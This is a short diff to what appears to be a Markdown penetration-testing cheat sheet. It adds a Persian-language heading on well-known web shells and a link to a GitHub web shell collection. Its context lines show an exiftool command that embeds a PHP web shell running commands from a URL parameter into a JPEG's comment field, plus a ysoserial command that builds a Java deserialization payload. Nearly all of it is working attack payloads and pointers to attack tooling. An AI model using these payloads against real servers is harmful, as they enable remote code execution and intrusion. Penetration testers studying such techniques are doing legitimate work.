@@ -262,3 +262,9 @@ exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' me.jpg
 ```text
 java -jar ysoserial.jar CommonsBeanutils1 'COMMAND' | base64 -w0
 ```
+
+## وب شل های معروف
+
+```text
+https://github.com/TheBinitGhimire/Web-Shells
+```
